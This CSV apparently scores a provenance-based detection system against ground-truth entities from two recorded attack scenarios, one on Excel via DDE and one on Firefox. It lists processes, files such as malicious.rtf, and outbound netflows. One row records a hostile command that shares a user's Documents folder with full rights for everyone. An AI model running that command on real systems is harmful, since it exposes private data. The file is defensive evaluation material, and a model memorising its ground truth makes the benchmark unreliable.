attack,gt_uuid,status,gt_type,gt_name,our_type,our_name,our_cmdline,type_match,name_match,mismatch_reason,resolved_uuid
fivedirections_e3_excel_0409,91386ee2-f150-4b10-8b18-954a8c04198d,thread→process,process,None None,process,excel.exe,"""C:\Program Files (x86)\Microsoft Office\Office15\EXCEL.EXE"" /dde",1,1,,ef82624e-5d48-4520-8642-0acf0651e5f7
fivedirections_e3_excel_0409,97485b66-8cfa-4448-ba56-8d7f67eba308,direct,process,"None C:\\WINDOWS\\system32\\net1  share mydocs=C:\\Users\\admin\\Documents\\mydocs /grant:everyone,FULL",process,net1.exe,"C:\WINDOWS\system32\net1  share mydocs=C:\Users\admin\Documents\mydocs /grant:everyone,FULL",1,0,gt_exe=c:\\windows\\system32\\net1,97485b66-8cfa-4448-ba56-8d7f67eba308
fivedirections_e3_excel_0409,ef82624e-5d48-4520-8642-0acf0651e5f7,direct,process,"None \""C:\\Program Files (x86)\\Microsoft Office\\Office15\\EXCEL.EXE\"" /dde",process,excel.exe,"""C:\Program Files (x86)\Microsoft Office\Office15\EXCEL.EXE"" /dde",1,0,"gt_exe=\""c:\\program",ef82624e-5d48-4520-8642-0acf0651e5f7
fivedirections_e3_excel_0409,cffdf1ef-1349-428e-a4e3-26460ee8f8f4,thread→process,process,None None,process,svchost.exe,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SysMain,1,1,,04f5e4ce-b003-4600-9ae5-5e240b7dbb56
fivedirections_e3_excel_0409,a2228fbe-118e-44c1-8d52-0a66d3cc12ac,direct,netflow,128.55.12.67:57619->208.75.117.5:80,netflow,128.55.12.67:57619->208.75.117.5:80,,1,1,,a2228fbe-118e-44c1-8d52-0a66d3cc12ac
fivedirections_e3_excel_0409,6c407dbe-9b5f-443f-bb1c-1dd12faa1c6c,direct,file,"{""Device\\\\DeviceApi""}",file,Device\DeviceApi,,1,1,,6c407dbe-9b5f-443f-bb1c-1dd12faa1c6c
fivedirections_e3_excel_0409,541e7952-4ce8-4ae4-9219-f450d3e6d300,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Desktop\\\\BoviaBenefitsOE.xlsm""}",file,Device\HarddiskVolume2\Users\admin\Desktop\BoviaBenefitsOE.xlsm,,1,1,,541e7952-4ce8-4ae4-9219-f450d3e6d300
fivedirections_e3_excel_0409,214db50b-fc64-492e-9246-aca531eb97e2,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Desktop\\\\BoviaBenefitsOE.xlsm:Zone.Identifier""}",file,Device\HarddiskVolume2\Users\admin\Desktop\BoviaBenefitsOE.xlsm:Zone.Identifier,,1,1,,214db50b-fc64-492e-9246-aca531eb97e2
fivedirections_e3_excel_0409,49dc2715-ec0f-46a7-8a39-9e6061204ac4,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Desktop\\\\BoviaBenefitsOE.xlsm""}",file,\Device\HarddiskVolume2\Users\admin\Desktop\BoviaBenefitsOE.xlsm,,1,1,,49dc2715-ec0f-46a7-8a39-9e6061204ac4
fivedirections_e3_firefox_0411,31fddee5-045e-411d-9f03-88e6f23af3fd,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\lwabeat\\\\logs\\\\lwabeat""}",file,\Device\HarddiskVolume2\lwabeat\logs\lwabeat,,1,1,,31fddee5-045e-411d-9f03-88e6f23af3fd
fivedirections_e3_firefox_0411,61abbb5b-0b8d-4e68-afae-12ced5e10c83,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.docx""}",file,\Device\HarddiskVolume2\Users\admin\Documents\trains.docx,,1,1,,61abbb5b-0b8d-4e68-afae-12ced5e10c83
fivedirections_e3_firefox_0411,64814a6f-a574-4ae0-a1b0-60a629744013,direct,netflow,128.55.12.67:57909->156.78.147.114:80,netflow,128.55.12.67:57909->156.78.147.114:80,,1,1,,64814a6f-a574-4ae0-a1b0-60a629744013
fivedirections_e3_firefox_0411,65c86f90-8007-4529-a0cf-09babc8a897f,direct,netflow,128.55.12.67:57910->16.54.116.146:80,netflow,128.55.12.67:57910->16.54.116.146:80,,1,1,,65c86f90-8007-4529-a0cf-09babc8a897f
fivedirections_e3_firefox_0411,40b43d4c-10a3-4228-82e2-dc1f3532b4c3,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_firefox_0411,3c6f1977-09c7-4cea-b3a8-763aa7c7ad8e,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Covert.xlsx""}",file,\Device\HarddiskVolume2\Users\admin\Documents\Covert.xlsx,,1,1,,3c6f1977-09c7-4cea-b3a8-763aa7c7ad8e
fivedirections_e3_firefox_0411,b64eac5d-665f-4382-87e7-f370bc9bc24c,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Covert.xlsx""}",file,Device\HarddiskVolume2\Users\admin\Documents\Covert.xlsx,,1,1,,b64eac5d-665f-4382-87e7-f370bc9bc24c
fivedirections_e3_firefox_0411,9f0085db-f398-4548-8dc9-a5310c1cf680,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,3b06be86-685f-4457-a165-a18730a575bc,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\WINDOWS\\\\System32\\\\drivers\\\\etc\\\\lmhosts""}",file,\Device\HarddiskVolume2\WINDOWS\System32\drivers\etc\lmhosts,,1,1,,3b06be86-685f-4457-a165-a18730a575bc
fivedirections_e3_firefox_0411,4eaad8da-6386-42fb-87c0-713ef425e8fe,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,49712b95-e89d-426b-a5a3-37e86a4d628a,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,0c0d443b-0354-481b-8bc1-f8cad8766630,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\Covert.xlsx""}",file,C:\Users\admin\Documents\Covert.xlsx,,1,1,,0c0d443b-0354-481b-8bc1-f8cad8766630
fivedirections_e3_firefox_0411,bc2c98d3-9699-485c-981a-eefc556c8c7f,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,2646324d-6896-4e51-8019-ff268d587399,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,1fddb51b-ebdc-4083-9f0c-62016907fe54,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\locomotives.rtf""}",file,C:\Users\admin\Documents\locomotives.rtf,,1,1,,1fddb51b-ebdc-4083-9f0c-62016907fe54
fivedirections_e3_firefox_0411,1c415180-6ad2-4c57-8711-a6d6877e7577,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\locomotives.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\locomotives.rtf,,1,1,,1c415180-6ad2-4c57-8711-a6d6877e7577
fivedirections_e3_firefox_0411,d85ad5cb-3af4-4c34-80e1-57ae0bafad66,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\locomotives.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\locomotives.rtf,,1,1,,d85ad5cb-3af4-4c34-80e1-57ae0bafad66
fivedirections_e3_firefox_0411,c893d828-c202-4d12-97dd-53debed478c3,thread→process,process,None None,process,system,,1,1,,c8f4cb99-30c9-4e5e-ab7d-4d86645c32a4
fivedirections_e3_firefox_0411,e8405db2-665e-463f-886c-ef9419b3c5b8,direct,file,{NULL},file,None,,1,0,path_diff,e8405db2-665e-463f-886c-ef9419b3c5b8
fivedirections_e3_firefox_0411,57bec9ec-cb15-4d37-9c13-c07f2e688cad,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts""}",file,\Device\HarddiskVolume2\Windows\System32\drivers\etc\hosts,,1,1,,57bec9ec-cb15-4d37-9c13-c07f2e688cad
fivedirections_e3_firefox_0411,8ee116e4-fcfd-4934-8822-f14e8b9c45db,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\Document.rtf,,1,1,,8ee116e4-fcfd-4934-8822-f14e8b9c45db
fivedirections_e3_firefox_0411,4b9a91ff-9531-4338-91f3-2f09168e423f,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,C:\Users\admin\Documents\Document.rtf,,1,1,,4b9a91ff-9531-4338-91f3-2f09168e423f
fivedirections_e3_firefox_0411,ed6eb0c5-6d59-4fd3-b2b8-809c49183af8,thread→process,process,None None,process,wordpad.exe,"""C:\Program Files\Windows NT\Accessories\wordpad.exe"" ",1,1,,cc990d40-5c2e-44da-a22f-74d985692ecd
fivedirections_e3_firefox_0411,782f5774-7e01-44b8-989e-e2cfa54a0e0d,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf,,1,1,,782f5774-7e01-44b8-989e-e2cfa54a0e0d
fivedirections_e3_firefox_0411,02edfe8d-ac2d-4b93-85f5-4da6a16f32ee,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,C:\Users\admin\Documents\MissleAlert.rtf,,1,1,,02edfe8d-ac2d-4b93-85f5-4da6a16f32ee
fivedirections_e3_firefox_0411,6deb1fcb-cd94-4c14-bd95-e2dc1e087105,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_firefox_0411,236258ac-bee3-4888-a2ec-7609ad28731f,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf,,1,1,,236258ac-bee3-4888-a2ec-7609ad28731f
fivedirections_e3_firefox_0411,2a9fba61-0097-42e9-b093-ac97ffbf809c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\KernelBase.dll""}",file,\Device\HarddiskVolume2\Windows\System32\KernelBase.dll,,1,1,,2a9fba61-0097-42e9-b093-ac97ffbf809c
fivedirections_e3_firefox_0411,6245414e-384b-4a9f-99a7-613d11c06cca,thread→process,process,None None,process,wordpad.exe,"""C:\Program Files\Windows NT\Accessories\wordpad.exe"" ",1,1,,cc990d40-5c2e-44da-a22f-74d985692ecd
fivedirections_e3_firefox_0411,fbc53640-d8fa-4876-b4c4-bdcbc5b54c81,direct,file,"{""Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts""}",file,Device\HarddiskVolume2\Windows\System32\drivers\etc\hosts,,1,1,,fbc53640-d8fa-4876-b4c4-bdcbc5b54c81
fivedirections_e3_firefox_0411,b8ca5857-4c0f-4e3c-8cda-25f7107199db,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\Document.rtf,,1,1,,b8ca5857-4c0f-4e3c-8cda-25f7107199db
fivedirections_e3_firefox_0411,6a6b1f91-cff0-4dd9-a2a2-314d47d42cec,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\malicious.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\malicious.rtf,,1,1,,6a6b1f91-cff0-4dd9-a2a2-314d47d42cec
fivedirections_e3_firefox_0411,3f01c20b-37b1-4f0b-bd6b-c5eea03987e4,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\malicious.rtf""}",file,C:\Users\admin\Documents\malicious.rtf,,1,1,,3f01c20b-37b1-4f0b-bd6b-c5eea03987e4
fivedirections_e3_firefox_0411,ef386827-c58c-41f0-a48a-fdfb892ab28f,direct,netflow,128.55.12.67:57911->193.189.212.26:80,netflow,128.55.12.67:57911->193.189.212.26:80,,1,1,,ef386827-c58c-41f0-a48a-fdfb892ab28f
fivedirections_e3_firefox_0411,0d5188c6-631e-4851-9866-4786e29fded7,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\malicious.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\malicious.rtf,,1,1,,0d5188c6-631e-4851-9866-4786e29fded7
fivedirections_e3_firefox_0411,255e412f-efdc-4a34-aacb-878071c24533,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_firefox_0411,dc15fe65-2b7f-47df-8120-dd085c814ab1,direct,netflow,128.55.12.67:53990->27.56.56.211:80,netflow,128.55.12.67:53990->27.56.56.211:80,,1,1,,dc15fe65-2b7f-47df-8120-dd085c814ab1
fivedirections_e3_firefox_0411,7e7dda23-ca19-454d-9a77-dfb533935682,direct,file,"{""C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts""}",file,C:\Windows\System32\drivers\etc\hosts,,1,1,,7e7dda23-ca19-454d-9a77-dfb533935682
fivedirections_e3_firefox_0411,96172979-436a-490b-add2-741b23e59f8c,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.docx""}",file,Device\HarddiskVolume2\Users\admin\Documents\trains.docx,,1,1,,96172979-436a-490b-add2-741b23e59f8c
fivedirections_e3_firefox_0411,9e8f6990-153b-4a4b-8499-3aaac2008e5b,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,C:\Users\admin\Documents\trains.rtf,,1,1,,9e8f6990-153b-4a4b-8499-3aaac2008e5b
fivedirections_e3_firefox_0411,4c1954fb-0316-485d-904b-31344d6649da,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\trains.rtf,,1,1,,4c1954fb-0316-485d-904b-31344d6649da
fivedirections_e3_firefox_0411,3ea7fb5e-0598-4974-9600-0cb44abb35ba,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\trains.rtf,,1,1,,3ea7fb5e-0598-4974-9600-0cb44abb35ba
fivedirections_e3_firefox_0411,8369e7bb-1cb8-4248-bb56-eeb748f1e10f,direct,process,"None \""C:\\Program Files\\Mozilla Firefox\\firefox.exe\"" ",process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,0,"gt_exe=\""c:\\program",8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,6dad2a77-ca08-43ed-919c-05df2aba0aee,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\Missledefence.doc""}",file,C:\Users\admin\Documents\Missledefence.doc,,1,1,,6dad2a77-ca08-43ed-919c-05df2aba0aee
fivedirections_e3_firefox_0411,d80128c7-d77d-4e27-87ff-86fa77a876e3,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Missledefence.doc""}",file,Device\HarddiskVolume2\Users\admin\Documents\Missledefence.doc,,1,1,,d80128c7-d77d-4e27-87ff-86fa77a876e3
fivedirections_e3_firefox_0411,0a70cd92-c604-45d9-896c-f987e0f7adae,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\trains.docx""}",file,C:\Users\admin\Documents\trains.docx,,1,1,,0a70cd92-c604-45d9-896c-f987e0f7adae
fivedirections_e3_firefox_0411,931a0745-8ace-491d-809c-87a23ec81c17,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\test.docx""}",file,C:\Users\admin\Documents\test.docx,,1,1,,931a0745-8ace-491d-809c-87a23ec81c17
fivedirections_e3_firefox_0411,bc25410c-b76b-41dc-bcb6-a0d6c2eded5c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Missledefence.doc""}",file,\Device\HarddiskVolume2\Users\admin\Documents\Missledefence.doc,,1,1,,bc25410c-b76b-41dc-bcb6-a0d6c2eded5c
fivedirections_e3_firefox_0411,698bde81-3f54-4cfc-8091-5d8491706fed,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\test.docx""}",file,\Device\HarddiskVolume2\Users\admin\Documents\test.docx,,1,1,,698bde81-3f54-4cfc-8091-5d8491706fed
fivedirections_e3_firefox_0411,b64310f3-d91f-4e7d-89bb-c3cb0522ac55,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\test.docx""}",file,Device\HarddiskVolume2\Users\admin\Documents\test.docx,,1,1,,b64310f3-d91f-4e7d-89bb-c3cb0522ac55
fivedirections_e3_firefox_0411,50a0ea8b-7c32-4638-a0ee-304678e1efea,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,58efdad0-cfd5-4012-9f5f-03b43906a905,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,ec170976-6f4a-473a-9a53-6dbda46b8865,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,66b504d5-8f99-440d-95f9-9252db693798,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,9b994a20-688a-4003-a527-32f816a6b2d3,direct,file,"{""C:\\\\Program Files\\\\Mozilla Firefox\\\\browser\\\\features\\\\[email]""}",file,C:\Program Files\Mozilla Firefox\browser\features\[email],,1,1,,9b994a20-688a-4003-a527-32f816a6b2d3
fivedirections_e3_firefox_0411,04746262-ae9d-40c0-8b1c-cac7044bd363,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
